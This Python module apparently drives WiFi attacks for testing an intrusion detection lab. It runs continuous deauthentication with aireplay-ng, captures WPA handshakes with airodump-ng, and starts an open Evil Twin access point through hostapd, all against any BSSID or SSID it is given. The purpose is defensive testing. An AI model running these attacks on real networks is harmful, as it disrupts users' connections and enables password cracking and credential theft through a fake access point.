"""
Attack controller for WiFi IDPS testing lab
LAB USE ONLY - Authorized testing environments only
"""
import subprocess
import threading
import time
import logging
import os
from datetime import datetime
from database import Database

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AttackController:
    def __init__(self):
        self.active_attack = None
        self.attack_process = None
        self.attack_thread = None
        self.attack_adapter = None
        self.db = Database()
        self.attack_start_time = None
        self.current_target = None
    
    def start_deauth_attack(self, interface, bssid, channel, count=0):
        """Start deauthentication attack (LAB ONLY) - count=0 for continuous"""
        if self.active_attack:
            return {'success': False, 'message': 'Attack already in progress'}
        
        if not interface or not bssid:
            return {'success': False, 'message': 'Missing required parameters'}
        
        self.active_attack = 'deauth'
        self.attack_adapter = interface
        self.attack_start_time = datetime.now().isoformat()
        self.current_target = {'bssid': bssid, 'channel': channel}
        
        # Log attack
        self.db.add_attack_log(
            attack_type='Deauthentication',
            adapter=interface,
            target_bssid=bssid,
            target_channel=channel,
            start_time=self.attack_start_time
        )
        
        logger.info(f"Starting deauth attack on {bssid} (channel {channel}) - continuous mode")
        
        # Start attack in background
        self.attack_thread = threading.Thread(
            target=self._run_deauth_attack,
            args=(interface, bssid, channel, count),
            daemon=True
        )
        self.attack_thread.start()
        
        return {'success': True, 'message': 'Deauth attack started (continuous)'}
    
    def start_handshake_capture(self, interface, bssid, channel, ssid, output_file=None):
        """Start handshake capture (LAB ONLY)"""
        if self.active_attack:
            return {'success': False, 'message': 'Attack already in progress'}
        
        if not interface or not bssid or not channel:
            return {'success': False, 'message': 'Missing required parameters'}
        
        self.active_attack = 'handshake'
        self.attack_adapter = interface
        self.attack_start_time = datetime.now().isoformat()
        self.current_target = {'bssid': bssid, 'channel': channel, 'ssid': ssid}
        
        if not output_file:
            output_file = f'/tmp/widps_handshake_{int(time.time())}'
        
        # Log attack
        self.db.add_attack_log(
            attack_type='Handshake Capture',
            adapter=interface,
            target_bssid=bssid,
            target_ssid=ssid,
            target_channel=channel,
            start_time=self.attack_start_time
        )
        
        # Start capture in background
        self.attack_thread = threading.Thread(
            target=self._run_handshake_capture,
            args=(interface, bssid, channel, ssid, output_file),
            daemon=True
        )
        self.attack_thread.start()
        
        return {'success': True, 'message': 'Handshake capture started', 'output_file': output_file}
    
    def start_rogue_ap(self, interface, ssid, channel, bssid=None):
        """Start rogue AP (Evil Twin) - LAB ONLY"""
        if self.active_attack:
            return {'success': False, 'message': 'Attack already in progress'}
        
        if not interface or not ssid or not channel:
            return {'success': False, 'message': 'Missing required parameters'}
        
        self.active_attack = 'rogue_ap'
        self.attack_adapter = interface
        self.attack_start_time = datetime.now().isoformat()
        self.current_target = {'ssid': ssid, 'channel': channel, 'bssid': bssid}
        
        # Log attack
        self.db.add_attack_log(
            attack_type='Rogue Access Point',
            adapter=interface,
            target_ssid=ssid,
            target_bssid=bssid,
            target_channel=channel,
            start_time=self.attack_start_time
        )
        
        # Start rogue AP in background
        self.attack_thread = threading.Thread(
            target=self._run_rogue_ap,
            args=(interface, ssid, channel, bssid),
            daemon=True
        )
        self.attack_thread.start()
        
        return {'success': True, 'message': 'Rogue AP started'}
    
    def _run_deauth_attack(self, interface, bssid, channel, count):
        """Execute deauthentication attack (continuous until stopped)"""
        try:
            # Set channel
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
                          capture_output=True, timeout=5)
            time.sleep(0.5)
            
            # Run aireplay-ng deauth continuously
            # Use 0 for continuous deauth (or high number)
            deauth_count = 0 if count <= 0 else count  # 0 = continuous
            
            cmd = ['aireplay-ng', '--deauth', str(deauth_count), '-a', bssid, interface]
            logger.info(f"Starting continuous deauth attack: {' '.join(cmd)}")
            self.attack_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Keep running until stopped
            while self.active_attack == 'deauth' and self.attack_process:
                if self.attack_process.poll() is not None:
                    # Process ended, restart it for continuous attack
                    logger.info("Deauth process ended, restarting for continuous attack...")
                    time.sleep(1)
                    self.attack_process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                time.sleep(2)  # Check every 2 seconds
            
        except Exception as e:
            logger.error(f"Error in deauth attack: {e}")
        finally:
            self._stop_attack()
    
    def _run_handshake_capture(self, interface, bssid, channel, ssid, output_file):
        """Execute handshake capture (continuous until stopped)"""
        try:
            # Ensure interface is in monitor mode
            iwconfig_result = subprocess.run(['iwconfig', interface], 
                                            capture_output=True, text=True, timeout=5)
            is_monitor = 'Mode:Monitor' in iwconfig_result.stdout
            
            if not is_monitor:
                logger.info(f"Enabling monitor mode on {interface} for handshake capture")
                subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                             capture_output=True, timeout=5)
                time.sleep(0.5)
                subprocess.run(['iw', interface, 'set', 'type', 'monitor'], 
                             capture_output=True, timeout=5)
                time.sleep(0.5)
                subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                             capture_output=True, timeout=5)
                time.sleep(1)
            
            # Set channel
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
                          capture_output=True, timeout=5)
            time.sleep(0.5)
            
            # Run airodump-ng to capture handshake continuously
            cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', output_file,
                '--output-format', 'cap',
                interface
            ]
            logger.info(f"Starting handshake capture: {' '.join(cmd)}")
            self.attack_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Keep running until stopped
            while self.active_attack == 'handshake' and self.attack_process:
                if self.attack_process.poll() is not None:
                    logger.warning("Handshake capture process ended unexpectedly")
                    break
                time.sleep(2)  # Check every 2 seconds
            
        except Exception as e:
            logger.error(f"Error in handshake capture: {e}")
        finally:
            self._stop_attack()
    
    def _run_rogue_ap(self, interface, ssid, channel, bssid):
        """Execute rogue AP (Evil Twin) - continuous until stopped"""
        hostapd_conf = None
        try:
            # Stop any existing hostapd on this interface
            subprocess.run(['pkill', '-f', f'hostapd.*{interface}'], 
                         capture_output=True, timeout=5)
            time.sleep(1)
            
            # Ensure interface is in managed mode first
            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                         capture_output=True, timeout=5)
            time.sleep(0.5)
            subprocess.run(['iw', interface, 'set', 'type', 'managed'], 
                         capture_output=True, timeout=5)
            time.sleep(0.5)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                         capture_output=True, timeout=5)
            time.sleep(1)
            
            # Create hostapd configuration file with proper settings
            hostapd_conf = f'/tmp/widps_hostapd_{int(time.time())}.conf'
            with open(hostapd_conf, 'w') as f:
                f.write(f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
""")
            
            logger.info(f"Starting rogue AP '{ssid}' on channel {channel} using interface {interface}")
            logger.info(f"HostAPd config: {hostapd_conf}")
            
            # Run hostapd to create rogue AP (run in background daemon mode)
            # Note: With -B flag, hostapd daemonizes and the parent process exits immediately
            # hostapd outputs status messages to stderr, including "AP-ENABLED" on success
            cmd = ['hostapd', '-B', hostapd_conf]  # -B for background daemon mode
            self.attack_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait a bit for hostapd to start and output status
            time.sleep(2)
            
            # Read stderr output (hostapd outputs status to stderr)
            # The parent process may have exited (normal with -B flag), so read what we can
            try:
                stdout, stderr = self.attack_process.communicate(timeout=1)
                output = stderr.decode('utf-8', errors='ignore') if stderr else stdout.decode('utf-8', errors='ignore')
            except subprocess.TimeoutExpired:
                # Process still running, try to read stderr
                output = ""
                try:
                    if self.attack_process.stderr:
                        output = self.attack_process.stderr.read(1024).decode('utf-8', errors='ignore')
                except:
                    pass
            
            # Check if output contains success indicators
            if 'AP-ENABLED' in output or 'interface state' in output:
                # Success! The AP is enabled
                logger.info(f"Rogue AP '{ssid}' started successfully on {interface}")
                logger.info(f"AP is broadcasting on channel {channel}")
            elif 'failed' in output.lower() or ('error' in output.lower() and 'AP-ENABLED' not in output):
                # Real error - no AP-ENABLED message
                logger.error(f"Hostapd failed to start: {output}")
                raise Exception(f"Hostapd failed: {output[:200]}")
            else:
                # No clear success or failure message, check if hostapd process is running
                check_process = subprocess.run(
                    ['pgrep', '-f', f'hostapd.*{hostapd_conf}'],
                    capture_output=True,
                    timeout=2
                )
                if check_process.returncode == 0:
                    logger.info(f"Rogue AP '{ssid}' process running on {interface}")
                else:
                    logger.warning(f"Could not confirm hostapd is running. Output: {output[:200]}")
            
            # Keep running until stopped
            # Note: With -B flag, the parent process exits, but hostapd daemon continues running
            # We check interface state as primary method since pgrep patterns may not match
            while self.active_attack == 'rogue_ap':
                hostapd_running = False
                
                # Primary check: Interface state (most reliable)
                try:
                    iwconfig_result = subprocess.run(
                        ['iwconfig', interface],
                        capture_output=True,
                        text=True,
                        timeout=3
                    )
                    if 'Mode:Master' in iwconfig_result.stdout:
                        # Interface is in AP mode - hostapd must be running
                        hostapd_running = True
                except:
                    pass
                
                # Secondary check: Process existence
                if not hostapd_running:
                    # Try multiple pgrep patterns
                    patterns = [
                        f'hostapd.*{os.path.basename(hostapd_conf)}',
                        f'hostapd.*{interface}',
                        'hostapd'
                    ]
                    
                    for pattern in patterns:
                        check_process = subprocess.run(
                            ['pgrep', '-f', pattern],
                            capture_output=True,
                            timeout=2
                        )
                        if check_process.returncode == 0:
                            hostapd_running = True
                            break
                
                if not hostapd_running:
                    # Hostapd not found - it may have crashed
                    logger.warning("Rogue AP process not found - hostapd may have stopped")
                    # Don't break immediately - wait a bit and check again
                    # Sometimes pgrep has timing issues
                    time.sleep(3)
                    
                    # Final check
                    final_check = subprocess.run(
                        ['pgrep', 'hostapd'],
                        capture_output=True,
                        timeout=2
                    )
                    if final_check.returncode != 0:
                        # Definitely not running
                        iwconfig_final = subprocess.run(
                            ['iwconfig', interface],
                            capture_output=True,
                            text=True,
                            timeout=3
                        )
                        if 'Mode:Master' not in iwconfig_final.stdout:
                            logger.warning("Rogue AP stopped - hostapd process not found and interface not in AP mode")
                            break
                
                time.sleep(2)  # Check every 2 seconds
            
        except FileNotFoundError:
            logger.error("hostapd not found. Install with: sudo apt install hostapd")
            logger.warning("Rogue AP attack requires hostapd to be installed")
        except Exception as e:
            logger.error(f"Error in rogue AP: {e}")
        finally:
            # Cleanup config file
            if hostapd_conf and os.path.exists(hostapd_conf):
                try:
                    os.remove(hostapd_conf)
                except:
                    pass
            self._stop_attack()
    
    def stop_attack(self):
        """Stop current attack"""
        if not self.active_attack:
            return {'success': False, 'message': 'No active attack'}
        
        attack_type = self.active_attack
        logger.info(f"Stopping {attack_type} attack")
        self._stop_attack()
        return {'success': True, 'message': f'{attack_type} attack stopped'}
    
    def stop_all_attacks(self):
        """Stop all active attacks"""
        stopped = []
        if self.active_attack:
            stopped.append(self.active_attack)
            self._stop_attack()
        
        # Also kill any lingering processes
        try:
            subprocess.run(['pkill', '-f', 'aireplay-ng'], capture_output=True, timeout=5)
            subprocess.run(['pkill', '-f', 'airodump-ng.*widps'], capture_output=True, timeout=5)
            subprocess.run(['pkill', '-f', 'hostapd.*widps'], capture_output=True, timeout=5)
        except:
            pass
        
        return {'success': True, 'message': f'Stopped {len(stopped)} attack(s)', 'stopped': stopped}
    
    def _stop_attack(self):
        """Internal method to stop attack"""
        # Set active_attack to None first to signal threads to stop
        attack_type = self.active_attack
        self.active_attack = None
        
        # Special handling for rogue AP - need to kill hostapd daemon and restart adapter
        if attack_type == 'rogue_ap' and self.attack_adapter:
            logger.info(f"Stopping rogue AP on {self.attack_adapter} - killing hostapd and restarting adapter")
            
            # Kill all hostapd processes (including daemonized ones)
            try:
                # Kill by process name
                subprocess.run(['pkill', '-9', 'hostapd'], capture_output=True, timeout=5)
                time.sleep(1)
                
                # Also try killing by interface pattern
                subprocess.run(['pkill', '-9', '-f', f'hostapd.*{self.attack_adapter}'], 
                             capture_output=True, timeout=5)
                time.sleep(1)
                
                # Double-check and kill any remaining
                check = subprocess.run(['pgrep', 'hostapd'], capture_output=True, timeout=2)
                if check.returncode == 0:
                    logger.warning("Some hostapd processes still running, force killing...")
                    subprocess.run(['pkill', '-9', 'hostapd'], capture_output=True, timeout=5)
                    time.sleep(1)
            except Exception as e:
                logger.error(f"Error killing hostapd: {e}")
            
            # Restart the adapter to ensure it's completely stopped
            try:
                interface = self.attack_adapter
                logger.info(f"Restarting adapter {interface} to ensure rogue AP is stopped")
                
                # Bring interface down
                subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                             capture_output=True, timeout=5)
                time.sleep(1)
                
                # Bring interface back up (will be in managed mode by default)
                subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                             capture_output=True, timeout=5)
                time.sleep(1)
                
                # Verify interface is no longer in AP mode
                iwconfig_result = subprocess.run(
                    ['iwconfig', interface],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if 'Mode:Master' in iwconfig_result.stdout:
                    logger.warning(f"Interface {interface} still in AP mode, forcing to managed mode")
                    # Force to managed mode
                    subprocess.run(['iw', interface, 'set', 'type', 'managed'], 
                                 capture_output=True, timeout=5)
                    time.sleep(1)
                    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                                 capture_output=True, timeout=5)
                
                logger.info(f"Adapter {interface} restarted and restored to managed mode")
            except Exception as e:
                logger.error(f"Error restarting adapter: {e}")
        
        # Handle other attack types normally
        if self.attack_process:
            try:
                # Try graceful termination first
                self.attack_process.terminate()
                try:
                    self.attack_process.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    # Force kill if it doesn't terminate
                    logger.warning("Process didn't terminate, forcing kill")
                    self.attack_process.kill()
                    self.attack_process.wait(timeout=2)
            except Exception as e:
                logger.error(f"Error stopping attack process: {e}")
                try:
                    self.attack_process.kill()
                except:
                    pass
            finally:
                self.attack_process = None
        
        if attack_type:
            # Log attack end
            stop_time = datetime.now().isoformat()
            self.db.update_attack_log(
                attack_type=attack_type,
                stop_time=stop_time
            )
            logger.info(f"{attack_type} attack stopped at {stop_time}")
        
        self.attack_start_time = None
        self.current_target = None
    
    def get_status(self):
        """Get attack status - verify attack is actually running"""
        is_active = self.active_attack is not None
        
        # For rogue AP, verify it's actually running by checking hostapd process
        if is_active and self.active_attack == 'rogue_ap' and self.attack_adapter:
            try:
                # Check if hostapd process is running
                check_process = subprocess.run(
                    ['pgrep', '-f', 'hostapd'],
                    capture_output=True,
                    timeout=2
                )
                hostapd_running = check_process.returncode == 0
                
                # Also check interface mode as backup
                iwconfig_result = subprocess.run(
                    ['iwconfig', self.attack_adapter],
                    capture_output=True,
                    text=True,
                    timeout=3
                )
                interface_in_ap_mode = 'Mode:Master' in iwconfig_result.stdout
                
                # Attack is active if hostapd is running OR interface is in AP mode
                if not hostapd_running and not interface_in_ap_mode:
                    # Both checks failed - attack might have stopped
                    logger.warning("Rogue AP checks failed (no hostapd process and interface not in AP mode)")
                    # Don't mark as inactive automatically - let user stop it manually
                    # Just log the warning
                else:
                    # At least one check passed - attack is running
                    is_active = True
            except Exception as e:
                logger.debug(f"Error checking rogue AP status: {e}")
                # On error, assume it's still running if active_attack is set
                pass
        
        return {
            'active': is_active,
            'attack_type': self.active_attack,
            'adapter': self.attack_adapter,
            'start_time': self.attack_start_time,
            'target': self.current_target
        }

